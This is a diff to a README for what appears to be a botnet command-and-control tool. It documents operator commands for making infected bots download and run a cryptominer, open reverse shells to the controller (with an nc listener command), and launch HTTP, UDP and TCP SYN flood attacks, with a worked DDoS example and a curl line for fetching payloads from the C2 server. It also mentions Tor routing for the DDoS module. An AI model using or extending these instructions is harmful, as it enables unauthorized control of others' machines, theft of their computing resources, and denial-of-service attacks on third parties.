@@ -70,15 +70,81 @@ python3 -m http.server 8000
 ```
 ## Command Syntax
 
-You can interact with connected bots using the terminal interface. Commands include:
+Once bots are connected to the C2, you can interact with them using the terminal interface.
+
+You can issue commands to all bots at once, or use the `target <index>` syntax to control a specific bot.
+
+### Core Commands:
 
 ```text
-load_payload mine.py        # Instruct bot to download mine.py from payload server
-run_payload mine.py         # Run the loaded mining script
-reverse_shell               # Start reverse shell connection to C2 (must be listening on port 9001)
-trigger_mine                # Instruct all bots to mine using mine.py
-trigger_ddos                # Instruct all bots to launch DDoS using ddos.py
+load_payload mine.py
 ```
+Instructs the bot to download `mine.py` from your HTTP payload server.
+
+```text
+run_payload mine.py
+```
+Executes the downloaded `mine.py` miner on the bot.
+
+```text
+reverse_shell
+```
+Opens a reverse shell session from the bot to your C2.  
+You must be listening on port `9001` with:
+
+```bash
+nc -lvnp 9001
+```
+
+### Triggered Payload Commands:
+
+```text
+trigger_mine
+```
+Tells all bots to run `mine.py` without needing to manually load it.  
+Implants must have previously fetched this payload or auto-load it on trigger.
+
+```text
+trigger_ddos
+```
+Tells all bots to launch the `ddos.py` module.
+
+You can also manually specify the DDoS target like so:
+
+```text
+run_payload ddos.py trigger_ddos <target_ip> <port> <duration> <threads> <mode>
+```
+
+#### Example:
+
+```text
+run_payload ddos.py trigger_ddos 192.168.0.99 80 60 150 http
+```
+
+This launches an HTTP flood attack on `192.168.0.99:80` for 60 seconds using 150 threads.
+
+### DDoS Modes Available:
+
+| Mode  | Description                            |
+|-------|----------------------------------------|
+| http  | HTTP GET flood with rotating headers   |
+| udp   | Raw UDP packet spam                    |
+| tcp   | TCP SYN flood                          |
+
+> Note: Ensure `ddos.py` and `mine.py` are hosted and visible to the bots via your payload server (typically served on port `8000`).
+
+---
+
+Need to test payload access?
+
+From the bot:
+
+```bash
+curl http://<C2_IP>:8000/mine.py
+```
+
+If the file downloads, the bot should be able to fetch it successfully.
+
 
 Tor Support (Optional)
 
@@ -107,18 +173,6 @@ And run the DDoS module as usual:
 ```bash
 python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
 ```
-
-
----
-
-### Reverse Shell
-
-To receive a reverse shell connection:
-
-```bash
-nc -lvnp 9001
-```
-
 ---
 
 ## Maintaining Bots
